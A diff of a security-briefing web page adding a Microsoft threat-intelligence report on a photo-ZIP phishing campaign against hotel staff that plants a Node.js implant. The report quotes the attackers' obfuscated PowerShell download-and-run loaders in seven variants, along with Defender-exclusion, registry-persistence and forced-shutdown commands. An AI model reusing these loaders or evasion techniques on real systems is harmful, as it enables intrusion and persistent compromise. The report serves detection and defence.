@@ -59,12 +59,511 @@
         </style>
     </head>
     <body>
-        <h1>Security Briefing // 2026-06-25</h1>
+        <h1>Security Briefing // 2026-06-26</h1>
         <div class="menu">
-            <ul><li><button onclick="show('art-0')">Cisco Catalyst SD-WAN Zero-Day CVE-2026-20245 Exploited to Gain Root Access</button></li><li><button onclick="show('art-1')">Mandiant reveals how Cisco SD-WAN zero-day attacks gained root access</button></li><li><button onclick="show('art-2')">CNAPP evolution: How Microsoft aligns with leading cloud risk management platforms</button></li><li><button onclick="show('art-3')">Disposable Tooling: Building LLM-Generated Mythic Agents from Prompt to Deployment</button></li><li><button onclick="show('art-4')">Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager</button></li><li><button onclick="show('art-5')">Stealthy Mistic backdoor linked to ransomware access broker KongTuke</button></li><li><button onclick="show('art-6')">Cisco Unified CM Flaw Exploited After PoC Reveals File-Write Path to Root</button></li><li><button onclick="show('art-7')">Scattered Spider Hackers Plead Guilty on Day 1 of Trial</button></li><li><button onclick="show('art-8')">Who Runs the Ransomware Group ‘The Gentlemen?’</button></li><li><button onclick="show('art-9')">How to Train Your (Dragons) Analysts - A TrustedSec Guide to Picking the Perfect Purple Team</button></li></ul>
+            <ul><li><button onclick="show('art-0')">Photo ZIP campaign targeting hospitality industry delivers Node.js implant for persistent access</button></li><li><button onclick="show('art-1')">New macOS malware embeds fake errors to confuse AI analysis tools</button></li><li><button onclick="show('art-2')">ThreatsDay Bulletin: Smart TV Proxyware, 24-Year curl Bug, AI Crime Forums + 13 More Stories</button></li><li><button onclick="show('art-3')">Cisco Catalyst SD-WAN Zero-Day CVE-2026-20245 Exploited to Gain Root Access</button></li><li><button onclick="show('art-4')">Large Workflows with Local LLMs</button></li><li><button onclick="show('art-5')">Mandiant reveals how Cisco SD-WAN zero-day attacks gained root access</button></li><li><button onclick="show('art-6')">Disposable Tooling: Building LLM-Generated Mythic Agents from Prompt to Deployment</button></li><li><button onclick="show('art-7')">Zero-Day Exploitation of Vulnerability (CVE-2026-20245) in Cisco Catalyst SD-WAN Manager</button></li><li><button onclick="show('art-8')">Scattered Spider Hackers Plead Guilty on Day 1 of Trial</button></li><li><button onclick="show('art-9')">Who Runs the Ransomware Group ‘The Gentlemen?’</button></li></ul>
         </div>
         
         <div id="art-0" class="article-body">
+            <h2 class="article-title">Photo ZIP campaign targeting hospitality industry delivers Node.js implant for persistent access</h2>
+            <p class="source-link">Source: Microsoft Security Blog | <a href="https://www.microsoft.com/en-us/security/blog/2026/06/25/photo-zip-campaign-targeting-hospitality-industry-delivers-node-js-implant-persistent-access/" target="_blank">Original Link</a></p>
+            <div class="content-text">Microsoft Threat Intelligence has identified an active multi-stage intrusion campaign targeting organizations in the hospitality and hotel industry since April 2026. We’ve observed this activity through aggregated threat intelligence and security signals across multiple organizations in Europe and Asia. Microsoft has not attributed this campaign to a known threat actor.
+The campaign uses photo-themed ZIP archives that the target users download through the browser. These archives contain fake image shortcut files that, when launched, start an attack chain that relies on obfuscated PowerShell, a Node.js-based implant, dual registry persistence, and command-and-control (C2) communications over non-standard ports. As of this writing, the campaign’s post-compromise activities include C2 beaconing, forced shutdowns, and compilation of portable executable (PE) payloads. While the campaign’s ultimate objective remains unclear, we assess that the threat actor’s investment in ensuring obfuscation and persistence could indicate that they’re preparing the victim devices for more follow-on activities.
+In late May 2026, we observed the threat actor misusing legitimate services—including the cloud-based scheduling platform Calendly’s email notification infrastructure and Google’s URL redirect functionality—to deliver phishing emails with multilingual lures and subject lines (for example, guest complaints and room inquiries) designed to convince hospitality staff to open the embedded malicious link and download the ZIP archive. These phishing emails attempt to bypass conventional authentication checks through a technique we describe as authentication laundering: by routing phishing messages through a trusted service’s sending infrastructure, the threat actor can make malicious messages appear similar to legitimate notifications to email authentication defenses.
+We’ve observed the campaign evolving in two distinct waves. The first wave (hereinafter referred to as Wave 1) used shortcut files named IMG-<random numbers>.png.lnk, while the second one (Wave 2) introduced a naming shift to PHOTO-<random numbers>.png.lnk. Wave 2 also introduced a new attack chain stage in which the PowerShell downloader triggered dynamic .NET DLL compilation through csc.exe, and the actor expanded its domain infrastructure to include .cfd domains hosted behind Cloudflare.
+This blog summarizes the campaign’s Wave 1 and Wave 2 attack chains and provides Microsoft Defender detections and recommendations. It’s intended to share threat intelligence to help organizations better understand, identify, and defend against similar attack techniques. The activity described reflects observed patterns and behaviors and is provided to support defensive security efforts.
+Attack chain overview
+The campaign follows a multi-stage attack chain with limited variation in overall behavior, even as the actor changed its PowerShell obfuscation and delivery refinements between waves.
+Initial access and user execution
+The campaign begins with delivery of a browser-downloaded archive with a file name that uses the pattern photo-<random numbers>.zip. In one observed activity, links to these archives were delivered through phishing emails. We assess that this file naming convention was designed to appear ordinary yet relevant to hospitality workflows, which commonly exchange guest photos, reservation-related images, or document snapshots.
+In Wave 1, the archive contained a fake image shortcut named IMG-<random numbers>.png.lnk, which masqueraded as a PNG file while remaining executable content. In Wave 2, the threat actor introduced a naming shift to PHOTO-<random numbers>.png.lnk (uppercase PHOTO prefix). Successful execution depended on a target user opening what appeared to be an image.
+The following table lists representative delivery artifacts observed across impacted environments in both campaign waves. The file sizes of the LNK files consistently fell within 1,989 to 2,079 bytes, suggesting the same builder tool.
+| LNK file | Source archive | Wave |
+| IMG-805916584.png.lnk | C:\Users\[REDACTED]\Downloads\photo-961032103.zip | 1 |
+| IMG-421741673.png.lnk | C:\Users\[REDACTED]\Downloads\photo-818773648.zip | 1 |
+| IMG-223099041.png.lnk | C:\Users\[REDACTED]\Downloads\photo-716449357.zip | 1 |
+| IMG-386443483.png.lnk | Browser download | 1 |
+| PHOTO-215746435.png.lnk | Browser download | 2 |
+Observed LNK and ZIP naming patterns across both campaigns.
+Observed victim device naming patterns, including reception- and front office-associated systems and hotel-named devices, confirm the threat actor’s focus on staff likely to interact with image or document attachments as part of day-to-day operations. Some of the user account names observed across impacted environments include the following strings, which refer to words in different languages such as English, French, Polish, Czech, and Spanish:
+- reception
+- frontdesk
+- reservations
+- accueil
+- recepcja
+- recepce
+- frontoffice
+Phishing infrastructure: Authentication laundering through legitimate services
+Beginning late May 2026, we observed that this campaign’s initial access mechanism also abuses legitimate web services to bypass email authentication controls and obscure the true destination of phishing links. This observation aligns with the [previously published](https://socprime.com/active-threats/technical-analysis-of-suspicious-emails-targeting-the-hotel-industry/) [findings](https://blog.itochuci.co.jp/entry/2026/06/11/110000?utm_source=chatgpt.com) by other security researchers.
+The threat actor uses Calendly’s email notification system and Google’s URL redirect functionality to construct a multi-hop delivery chain in which the direct Calendly path passes Sender Policy Framework (SPF), DomainKeys Identified Mail (DKIM), and Domain-based Message Authentication, Reporting, and Conformance (DMARC) checks.
+Lure themes and language targeting
+The sender display name across all observed emails is “Booking Manager (via Calendly),” a social engineering choice that appears designed to exploit hospitality staff’s familiarity with booking and scheduling workflows.
+Across the relayed messages, Microsoft observed the following small set of recurring social-engineering themes delivered in Japanese, Danish, and Dutch:
+- Guest complaints
+- Bedbug (Cimex) infestation reports
+- Verification call notices
+- Room condition inquiries
+- Stay review requests
+These lures are deliberately generic and non-personalized: every subject references an anonymous “guest,” “facility,” or “your accommodation,” and none contains a recipient name, guest name, or organization name. This is consistent with high-volume, list-driven distribution rather than tailored spear-phishing. The threat actor relies on urgency and reputational pressure (complaints, “final warning,” health-authority inspection, possible suspension) to drive target hospitality staff to click.
+| Language | Canonical lure (theme) |
+| Japanese | Serious guest complaint |
+| Japanese | Bedbug complaint, verification call |
+| Japanese | Guest stay review request |
+| Japanese | Room condition, facility inquiry |
+| Japanese | Final warning: infestation, forced inspection |
+| Danish | Bedbug complaint, inspection call |
+| Danish | Formal complaint, notice of suspension |
+| Danish | Health-risk safety alert |
+| Dutch | Complaint: possible danger, hospitalization after stay |
+Phishing lure themes by language, listed by observed prevalence.
+The threat actor reuses the same themes across all three languages, with Japanese as the most prevalent. Notably, unfilled template placeholders—such as a literal ID token in the Danish variant—appeared in some subjects, indicating automated, templated generation.
+Use of Calendly notification infrastructure as a phishing relay
+The threat actor uses a threat actor-controlled Calendly account associated with the subdomain em1618.calendly.com to relay phishing emails to hospitality targets. Authentication results differ by delivery path.
+| Authentication Check | Result | Why |
+| SPF | Pass | Email sent from authorized service |
+| DKIM | Pass | Signed by Calendly’s SendGrid sending infrastructure |
+| DMARC | Pass | Alignment on calendly.com domain |
+| Composite authentication (CompAuth) | Pass | All checks align |
+Authentication results for emails sent through the direct Calendly path. The checks pass because the messages are sent through authorized Calendly-associated sending infrastructure; this does not validate the intent or safety of the message content.
+This technique, which we describe as authentication laundering in this context, exploits the trust model of email authentication. SPF, DKIM, and DMARC verify that an email was sent from authorized infrastructure for a given domain. When the sending domain is a legitimate service and the threat actor controls the message content, these checks confirm the sender is authorized while saying nothing about the intent of the message.
+Multi-hop redirect chain
+Each phishing email contains a Calendly redirect URL that initiates a multi-hop chain intended to obscure the final destination from users and automated URL analysis. The embedded Calendly link routes victims through a four-hop chain before reaching the payload:
+- Step 1: calendly[.]com/url?q=hxxps://share[.]google/TOKEN → HTTP 302
+- Step 2: share[.]google/TOKEN → HTTP 302
+- Step 3: www.google[.]com/share_google?q=TOKEN → HTTP 301
+- Step 4: photo-*[.]cfd → Phishing landing page (Cloudflare challenge gate)
+Calendly’s Link Safety Service interstitial (url?q=) was used as the first hop and Google’s share[.]google redirect as the second. The final .cfd landing pages were freshly registered (for example, photo-26654[.]cfd was 17 days old at the time of analysis), Cloudflare-fronted, and gated behind a Cloudflare Turnstile (“verify you are human”) challenge that doubles as an anti-analysis and geo-gating mechanism before serving the photo-themed ZIP.
+Microsoft assesses that this redirect architecture serves multiple evasion purposes:
+- Fragmentation of URL reputation: No single URL in the chain is inherently malicious at the time of delivery
+- Abuse of Google’s open redirect: The share.google → NULLwww.google.com/share_google redirect leverages Google infrastructure, adding trusted reputation to the chain
+The threat actor maintains a second delivery variant that bypasses the share.google intermediate step, linking directly from a Calendly redirect URL to the phishing domain (calendly[.]com/url?q=photo-*[.]cfd). Microsoft observed that both variants are active simultaneously, with the same Calendly user UUIDs appearing across both paths. This supports the assessment that a single operator is managing the parallel delivery mechanisms.
+PowerShell-based first stage
+Once the malicious shortcut is opened, the next-stage payload invokes PowerShell and launches an obfuscated BigInt decoder. Across the campaign, the PowerShell stage consistently decodes data and then downloads an additional .ps1 file. Microsoft observed a repeating pattern of BigInt decoder → Invoke-WebRequest → .ps1. The full obfuscation evolution across seven phases is detailed in the Obfuscation evolution section of this blog.
+The decoded URL points to the campaign’s download domains. In the validated chain, the .ps1 file is retrieved from the photo-*.cfd landing domain
+.NET DLL compilation (Wave 2)
+In Wave 2, we observed a new intermediate stage between the PowerShell download and Node.js deployment. The downloaded .ps1 script triggers dynamic .NET compilation through csc.exe (the C# compiler), which in turn invokes cvtres.exe (the resource-to-object converter). This sequence produces small DLL files with random names.
+Representative observed artifacts:
+| Artifact | Details |
+| PowerShell script | qFWe908J.ps1 ( Size 419 KB) |
+| Compiled DLL | bjygtujc.dll Size 3,072 bytes) |
+csc.exe → cvtres.exe → <random>.dll (3,072 bytes)
+Figure 2. Wave 2 .NET DLL compilation chain. The compiled DLL was created but wasn’t observed being loaded through rundll32 or regsvr32 in available telemetry. This stage might be preparatory or conditional.
+Microsoft assesses that this stage wasn’t present in Wave 1 and represents an expansion in the attack chain.
+Script staging and Node.js implant deployment
+After decoding and retrieval, the downloaded PowerShell script runs from the %TEMP% folder. This staging step appears to be transitional rather than final, enabling subsequent download or launch of the campaign’s Node.js component.
+We observed the next step as execution of node.exe from a user-space path. The Node runtime version observed across both waves is node-v24.13.0-win-x64 (SHA-256: d14ba95cdce1ef7dc9ad3ac74949ca5db38b27378ee30f30a23cf26f9e875a11, 89.9 MB – downloaded from the legitimate nodejs[.]org site).
+Figure 3 shows representative observed command lines:
+"node.exe" C:\Users\[REDACTED]\AppData\Local\Nodejs\E2HPVoYGA77RECeb.js safedocphoto[.]info "node.exe" C:\Users\[REDACTED]\AppData\Local\Nodejs\jVXvdhxNfcqHuSf.js recallnine[.]info "node.exe" C:\Users\[REDACTED]\AppData\Local\Nodejs\c4yCFRzE.js kentjerk[.]info "node.exe" C:\Users\[REDACTED]\AppData\Local\Nodejs\FfXznFDs8.js photodoc-secure[.]info "node.exe" C:\Users\[REDACTED]\AppData\Local\Nodejs\f76qtHrP.js kelopins[.]info |
+Figure 3. Node.js implant execution with random JavaScript filenames and C2 domain arguments.
+The Node.js runtime functions as the interpreter for the implant’s .js payloads. Microsoft assesses that placing the runtime in a user-writable location could help the threat actor avoid dependencies on a system-installed Node.js binary while also supporting repeated payload reuse across different filenames. Hash reuse across distinct filenames confirms reuse of the same binaries, reinforcing the assessment that the threat actor prioritizes operational repeatability.
+The Node.js implant also establishes its own persistence by spawning PowerShell to create a detached, hidden child process:
+powershell.exe -c "$code = \"require('child_process').spawn(process.execPath, ['C:\\Users\\[REDACTED]\\AppData\\Local\\Nodejs\\<random>.js'], {detached: true, stdio: 'ignore', windowsHide: true}).unref()\"; $command = ... </random> |
+Figure 4. Node.js persistence mechanism using child_process.spawn with detached and windowsHide flags.
+Defense evasion and payload execution
+Once the Node.js component is established, the campaign modifies Defender settings by using Add-MpPreference -ExclusionProcess for temporary-path executables. We assess that this exclusion step is intended to reduce inspection of follow-on binaries located in AppData\Local\Temp. Figure 5 shows representative observed exclusion commands:
+powershell.exe -c "Add-MpPreference -ExclusionProcess \"C:\Users\[REDACTED]\AppData\Local\Temp\utramdJQjRMJ.exe\"" powershell.exe -c "Add-MpPreference -ExclusionProcess \"C:\Users\[REDACTED]\AppData\Local\Temp\YEg9nfBg3QG4.exe\"" powershell.exe -c "Add-MpPreference -ExclusionProcess \"C:\Users\[REDACTED]\AppData\Local\Temp\57AVjhcz6vL0c.exe\"" powershell.exe -c "Add-MpPreference -ExclusionProcess \"C:\Users\[REDACTED]\AppData\Local\Temp\sDNud94J7WVDN.exe\"" |
+Figure 5. Defender process exclusions added for randomly named EXE files seconds before their execution.
+These excluded random EXE files in AppData\Local\Temp are then launched, followed by helper .tmp installers or unpackers that used names matching is-*.tmp and commonly ran with /SL5 or /VERYSILENT. This combination suggests a deployment chain in which the Node.js implant stages additional binaries, then launches installer-like helpers to unpack or execute the next payload. Microsoft assesses that the .tmp convention and silent-install flags are likely chosen to minimize user awareness while also obscuring the actual payload family.
+ProgramData relocation and persistence
+Observed payloads are then copied into C:\ProgramData\<random>\<payload>.exe. Lowercase copies with the same hash appear under different filenames, which is consistent with repackaging or relocation for stability rather than recompilation. Figure 6 shows representative observed ProgramData paths from the campaign:
+C:\ProgramData\FFXjwKn\fehqf5oo.exe C:\ProgramData\PEIEZlD\qulcp452eb9.exe C:\ProgramData\YXbwfua\e6kz1ruadskkk.exe C:\ProgramData\PsrOqKF\vl8daccehg.exe C:\ProgramData\riloNEK\s8bpfaee.exe C:\ProgramData\JMSVrLU\choffgpa.exe |
+Figure 6. ProgramData relocation paths with randomized folder names and lowercase payload filenames.
+The persistence model used in this campaign is especially notable. We observed a dual mechanism in which HKCU\RunOnce pointed to the ProgramData executable while HKCU\Run pointed to the Node.js component. Figure 7 shows a representative registry persistence command:
+cmd /c reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v "zZBPZPuA" /t REG_SZ /d "C:\ProgramData\FFXjwKn\fehqf5oo.exe" /f |
+Figure 7. Registry RunOnce persistence pointing to ProgramData payload with randomized value name.
+The RunOnce behavior is particularly unusual because the payload refreshes its own persistence after each execution, effectively creating a RunOnce loop. Microsoft assesses that this design might have been intended to complicate cleanup by repopulating an entry that defenders might otherwise treat as one-time execution.
+Command and control
+In later stages of the campaign, compromised systems beacons to fixed IP infrastructure over non-standard ports including:
+- 8443
+- 8445
+- 8453
+- 5555
+- 56001
+- 56002
+- 56003
+We observed the campaign expanding its C2 infrastructure between waves:
+Wave 1 IPs:
+- 178.16.54[.]27
+- 95.217.97[.]121
+- 193.202.84[.]32
+- 178.16.55[.]179
+The IP address 178.16.54[.]27 remains active on ports 56001/56002 across both waves.
+We also observed numerous unique domains themed around photos, documents, visas, safes, and vaults, spanning top-level domains (TLDs) such as the following:
+- .info
+- .com
+- .pro
+- .xyz
+- .cloud
+- .icu
+- .sbs
+- .click
+- .bond
+- .cfd (Wave 2)
+Wave 2 introduced Cloudflare-hosted .cfd domains following a photo-<random numbers> naming convention:
+- photo-26254[.]cfd
+- photo-26654[.]cfd
+- photo-132454[.]cfd
+- photo-8632454[.]cfd
+The domain sec-safe-dc[.]info was observed active in both waves, further supporting the assessment of a single continuous campaign.
+Obfuscation evolution
+A defining characteristic of this campaign is its steady but disciplined obfuscation evolution. Microsoft observed seven PowerShell obfuscation phases over the course of the campaign, but the underlying logic remained consistent: decode embedded data through arithmetic operations, recover the next-stage content, and retrieve a PowerShell script that runs from the %TEMP% folder. This pattern suggests that the threat actor is iterating for durability against static detections rather than experimenting with entirely new tradecraft.
+Phase 1: XOR bigint decoding
+Early samples rely on XOR arithmetic, using two large integers and a -bxor operation, followed by byte masking and shifting. The following is a representative observed command line:
+powershell.exe -ep bypass -c "$k=[bigint]\"2004985473718821432817707887657617\"; $w=[bigint]\"278573358569528286847653191217377\";$o=$k -bxor $w; while($o -ne 0){$g+=[char]([int]($o -band 0xFF));$o=$o -shr 8}; iwr $g -OutFile $env:TEMP\eRJGv.ps1 -UseBasicParsing; powershell -ep bypass -File $env:TEMP\eRJGv.ps1" |
+Figure 9. Phase 1 PowerShell downloader using XOR-based bigint decoding with -bxor, -band 0xFF, and -shr 8.
+Phase 2: Subtraction replaces XOR
+Microsoft then observed the threat actor swapping XOR logic for subtraction while keeping the rest of the decoder identical. This change bypasses detections anchored on -bxor:
+powershell.exe -ep bypass -c "$i=[bigint]\"1568015162836542885394310232785365293\"; $y=[bigint]\"989592658109712364469795296253690811\";$r=$i - $y; while($r -ne 0){$m+=[char]([int]($r -band 0xFF));$r=$r -shr 8}; iwr $m -OutFile $env:TEMP\VJksAkfp.ps1 -UseBasicParsing; powershell -ep bypass -File $env:TEMP\VJksAkfp.ps1" |
+Figure 10. Phase 2 variant replacing -bxor with subtraction while preserving the same decoding structure.
+Phase 3: Hexadecimal to decimal substitution
+The decoder then shifts from -band 0xFF to -band 255. Although functionally equivalent (0xFF = 255), this change is consistent with a threat actor testing whether surface-level constant changes could degrade signature reliability:
+powershell.exe -ep bypass -c "$e=[bigint]\"1080978693158786688289132234139422058835788841232\"; $l=[bigint]\"444996423444240363171355535687083720697400778653\";$w=$e - $l; while($w -ne 0){$j+=[char]([int]($w -band 255));$w=$w -shr 8}; iwr $j -OutFile $env:TEMP\ymqMj.ps1 -UseBasicParsing; powershell -ep bypass -File $env:TEMP\ymqMj.ps1" |
+Figure 11. Phase 3 variant replacing 0xFF with decimal 255.
+Phase 4: Arithmetic masking
+Masking expressions are further transformed into arithmetic forms that evaluate to the same constant. This variation prevents simple string matching on either 0xFF or 255:
+powershell.exe -ep bypass -c "$e=[bigint]\"988466760738254167909712279829942477\"; $y=[bigint]\"352542850680807474382013127968401501\";$i=$e - $y; while($i -ne 0){$b+=[char]([int]($i -band (177+78)));$i=$i -shr 8}; iwr $b -OutFile $env:TEMP\23QbL.ps1 -UseBasicParsing; powershell -ep bypass -File $env:TEMP\23QbL.ps1" |
+Figure 12. Phase 4 variant hiding the byte mask behind arithmetic expressions such as (177+78).
+Other observed arithmetic masks included -band (100+155) and -band 128+127, all resolving to 255.
+Phase 5: Modulo and division
+Later samples replace the bit-shift model entirely, switching from -band and -shr to modulo and division operations:
+powershell.exe -ep bypass -c "$s=[bigint]\"28248557062916408148263140002288993200489702\"; $o=[bigint]\"18544237761852163685406436002210545666450291\";$e=$s - $o; while($e -ne 0){$x+=[char]([int]($e -band (255)));$e=$e -shr 8}; iwr $x -OutFile $env:TEMP\PVtvOP40.ps1 -UseBasicParsing; powershell -ep bypass -File $env:TEMP\PVtvOP40.ps1" |
+Figure 13. Phase 5 transitional variant; later samples in this phase fully replaced -band/-shr with % 256 and / 256.
+Phase 6: Syntax diversification and randomization
+The threat actor adopts “num” -as [bigint] casting syntax, introduces long random variable names, and uses modulo/division for byte extraction. The combined effect makes each sample visually distinct despite identical logic:
+powershell.exe -ep bypass -c "$zGjEc0LINYdefj=\"25908558764390958596189327204542\" -as [bigint]; $MyL4evU3=256; $GqA4xFav=\"17082531775760189576112827972435\" -as [bigint]; $XwcU0kg87CFgqe5=$zGjEc0LINYdefj - $GqA4xFav; while($XwcU0kg87CFgqe5 -ne 0){ $qy8gWy4FONBaCV+=[char]([int]($XwcU0kg87CFgqe5 % $MyL4evU3)); $XwcU0kg87CFgqe5=$XwcU0kg87CFgqe5 / $MyL4evU3}; iwr $qy8gWy4FONBaCV -OutFile $env:TEMP\<random>.ps1 -UseBasicParsing; powershell -ep bypass -File $env:TEMP\<random>.ps1" </random></random> |
+Figure 14. Phase 6 variant using -as [bigint] syntax, long randomized variable names, and modulo/division decoding.
+Phase 7: For-loop variant with arithmetic mask (Wave 2)
+The most recent observed phase introduces a for-loop iteration model with an arithmetic mask using a variable set to 100+156 (=256) and -as [bigint] casting. This is a natural evolution of Phase 6’s syntax diversification, further altering the control flow structure while preserving the same underlying decode-and-download behavior:
+powershell.exe -ep bypass -c "$IcZWdT=100+156; $<var>=\"<bigint_value>\" -as [bigint]; $<var2>=\"<bigint_value2>\" -as [bigint]; $<result>=$<var> - $<var2>; for($i=0; $<result> -ne 0; $i++){ $<output>+=[char]([int]($<result> % $IcZWdT)); $<result>=[bigint]($<result> / $IcZWdT)}; iwr $<output> -OutFile $env:TEMP\<random>.ps1 -UseBasicParsing; powershell -ep bypass -File $env:TEMP\<random>.ps1" </random></random></output></result></result></result></output></result></var2></var></result></bigint_value2></var2></bigint_value></var> |
+Figure 15. Phase 7 variant (Wave 2) introducing a for-loop with arithmetic mask $IcZWdT=100+156 and -as [bigint] casting.
+This seven-phase evolution demonstrates a threat actor that monitors or anticipates detection pressure. The campaign doesn’t pivot away from PowerShell or Node.js; instead, it repeatedly re-skins a working loader. For defenders, this means purely literal detections on isolated operators, constants, or variable names might age quickly, while behavior-based detections anchored on the full sequence—shortcut execution, PowerShell decode, %TEMP% staging, Node.js from user space, Defender exclusions, and ProgramData persistence—are likely to remain more resilient.
+Campaign evolution
+Microsoft assesses that the observable differences between Wave 1 and Wave 2 represent a deliberate operational evolution by the same threat actor. The following cross-wave correlations support this assessment:
+Evidence of a single continuous campaign
+| Indicator | Wave 1 (April to May 2026) | Wave 2 (Late May to June 2026) | Assessment |
+| PE payload hash (xmnrwv9l.exe) | 04ec44f2618460f5c77c5e56014a512cc03a123c9c5b6b6b1273e2a1681ac2e1 | Same hash observed | Same payload binary |
+| C2 IP | 178.16.54[.]27 | Same IP, ports 56001/56002 | Same infrastructure |
+| Node.js version | v24.13.0-win-x64 | v24.13.0-win-x64 | Same runtime |
+| Domain | sec-safe-dc[.]info | Active in both waves | Shared domain |
+| C2 ports | 56001, 56002, 56003 | 56001, 56002 | Same non-standard port pattern |
+Cross-wave artifact overlaps demonstrating a single continuous campaign.
+What changed between waves
+| Dimension | Wave 1 (April to May 2026) | Wave 2 (Late May to June 2026) |
+| LNK naming | IMG-<random numbers>.png.lnk | PHOTO-<random numbers>.png.lnk |
+| ZIP contents | LNK only | LNK (PHOTO- prefix) |
+| Attack chain | PowerShell → Node.js | PowerShell → csc.exe/cvtres.exe → DLL → Node.js |
+| Obfuscation | Phases 1–6 | Phase 7 (for-loop variant) |
+| Domain TLDs | .info, .com, .pro, .xyz, .cloud, .icu, .sbs | Added .cfd, .click, and .bond |
+| Infrastructure | Direct hosting | Cloudflare-fronted .cfd domains |
+| C2 domains | Photo, document, and visa themes | Added zloapobikahy23[.]bond, higoksbupwou[.]com, aluminiostramuntana[.]com |
+Summary of campaign evolution from Wave 1 to Wave 2.
+Microsoft assesses that these changes reflect operational maturation rather than a shift in objectives. The threat actor expanded evasion (DLL compilation, Cloudflare fronting) and broadened targeting—all while maintaining the same core attack chain and reusing key infrastructure.
+Persistence survival analysis
+One of the significant findings from Wave 2 is the demonstrated resilience of the dual persistence model under active Defender intervention.
+On a confirmed compromised device, Defender detected and blocked one PE payload (xmnrwv9l.exe, SHA-256: 04ec44f2618460f5c77c5e56014a512cc03a123c9c5b6b6b1273e2a1681ac2e1) with Wacatac detections. Despite that block, the Node.js HKCU\Run key persistence remained active. Approximately two days later, the Node.js implant reactivated and resumed C2 communications to new domains.
+Following the initial block, Microsoft observed additional /VERYSILENT EXEs deployed on the same device:
+cBA8H4S5k04jAY.exe eaa3q8BQZcnIOV.exe BaUWXagH4CGZS.exe CJE4domtVFM9LX.exe |
+Figure 18. Additional payload EXEs deployed after Defender blocked the initial PE, demonstrating the implant’s ability to retry delivery through the surviving Node.js persistence.
+This sequence highlights a remediation consideration: the dual persistence model (RunOnce for the PE payload + Run for Node.js) means that blocking one execution path might not fully neutralize the other. The Node.js implant, if it remains active, can re-download and re-attempt payload delivery. Microsoft assesses that complete remediation of this campaign requires removal of both persistence mechanisms—the ProgramData RunOnce entry and the Node.js Run key—along with the Node.js runtime and associated .js files from the user’s AppData\Local\Nodejs\ directory.
+Post-compromise activity
+Microsoft observed a subset of devices reaching clear late-stage post-compromise behavior. On multiple devices, the activity progressed to active C2 beaconing, browser automation with –headless –no-sandbox flags, and environment lookups. Based on the command-line pattern alone, Microsoft assesses that the threat actor likely used automated browser execution rather than manual interactive browsing on those hosts.
+The campaign also performed an environment lookup using ip-api[.]com, observed through 208.95.112[.]1. This behavior is consistent with gathering external network context before continuing operations. Microsoft assesses that this lookup might have helped the operator understand geographic or connectivity attributes of the compromised device environment.
+A final disruptive behavior involved forced shutdown through cmd /c shutdown -s -t 0, observed on multiple devices. Microsoft assesses that immediate shutdown could have served several purposes depending on the host context: interruption of user activity, reduction of defender response time during a specific stage, or concealment of visible symptoms after automated browser tasks or payload launches completed.
+The persistence design itself is a meaningful post-compromise observation. The combination of a durable Node.js launch point in HKCU\Run and a repeatedly refreshed ProgramData payload through HKCU\RunOnce suggests an effort to maintain execution options across user sign-ins while also preserving a secondary recovery path. This RunOnce loop is unusual enough that it might provide defenders with a strong hunting pivot even when file names, domains, or script syntax change.
+Mitigation and protection guidance
+Organizations in hospitality and adjacent service industries should prioritize layered detections for this campaign’s behavior sequence rather than any single indicator. Microsoft recommends the following actions based on the observed attack chain:
+- Treat photo-themed ZIP archives and fake image shortcuts as high risk. Investigate browser-downloaded archives matching photo-<random numbers>.zip and shortcut files matching IMG-<random numbers>.png.lnk or PHOTO-<random numbers>.png.lnk, especially when they’re followed by PowerShell or script interpreter launches.
+[Learn more about attack surface reduction rules](https://learn.microsoft.com/defender-endpoint/attack-surface-reduction-rules-reference)
+- Harden and monitor PowerShell execution. Because the campaign repeatedly used obfuscated BigInt arithmetic across seven phases, defenders should prioritize PowerShell activity that includes unusual combinations of BigInt casting, subtraction or XOR decode logic, byte masking, modulo or division byte extraction, for-loop decode patterns, and subsequent Invoke-WebRequest behavior.
+[Learn more about PowerShell constrained language](https://learn.microsoft.com/powershell/module/microsoft.powershell.core/about/about_language_modes)
+- Monitor for unexpected .NET compilation. The appearance of csc.exe spawning cvtres.exe and producing small DLLs in user-writable paths, especially when initiated by PowerShell scripts from %TEMP%, is unusual in hospitality environments and should be investigated.
+- Investigate Node.js execution from user-space paths. node.exe running from C:\Users\<user>\AppData\Local\Nodejs\ with a random .js file and domain argument is unusual in many enterprise environments. Microsoft recommends reviewing whether Node.js is expected on reception, front office, or similarly targeted systems.
+- Alert on Defender exclusion changes tied to temporary executables. Add-MpPreference -ExclusionProcess aligned to %TEMP% or AppData\Local\Temp should be treated as suspicious when associated with shortcut-driven or script-driven execution chains.
+[Learn more about tamper protection](https://learn.microsoft.com/defender-endpoint/prevent-changes-to-security-settings-with-tamper-protection).
+- Hunt for random EXE launches from temporary paths and helper .tmp installers. The campaign uses numerous unique temporary executable filenames and helper is-*.tmp files with /SL5 or /VERYSILENT. These patterns are likely more durable than individual filenames.
+- Review persistence in both HKCU\Run and HKCU\RunOnce. Pay particular attention to values that launch node.exe from user directories or reference executables under C:\ProgramData\<random>\. Because the campaign refreshes RunOnce, repeated recreation of that value might be a strong signal. Critically, both keys must be removed during remediation—removing only the RunOnce entry leaves the Node.js implant active.
+- Monitor network connections on the observed non-standard ports. Outbound traffic to 8443, 8445, 8453, 5555, 56001, 56002, and 56003, especially when initiated by node.exe or executables from user profile and temporary paths, should be reviewed promptly.
+- Block or alert on .cfd domains matching the campaign pattern. Wave 2 domains follow a photo-<digits>[.]cfd naming convention. Organizations should consider blocking these patterns and monitoring for DNS queries to recently registered .cfd domains.
+- Investigate browser automation and forced shutdown patterns. The combination of –headless –no-sandbox and cmd /c shutdown -s -t 0 might indicate late-stage execution on selected hosts.
+- Use sector-aware hunting. Because Microsoft observed concentration in hospitality and hotel environments across multiple countries, organizations should review devices associated with front desk, reservation, reception, and guest-facing workflows first.
+Microsoft Defender XDR detections
+Microsoft assesses that Microsoft Defender coverage for this campaign is most effective when it combines process, registry, file, and network telemetry rather than relying on blocking individual indicators of compromise (IOCs).
+TonRAT is the campaign’s implant family (validated on the dropped .ps1 and .js payloads). “Wacatac” and “PureRat” are Microsoft Defender detection names that fire on specific binaries in the attack chain (the LNK or PE payload and the ProgramData persistence executable, respectively).
+Beyond signature-based prevention, Microsoft Defender can surface this campaign through behavioral detections, including alerts such as Suspicious Node.js child process execution and Node.js Hidden Run‑Key Persistence, which are designed to identify implant activity even as file names, domains, and script syntax change.
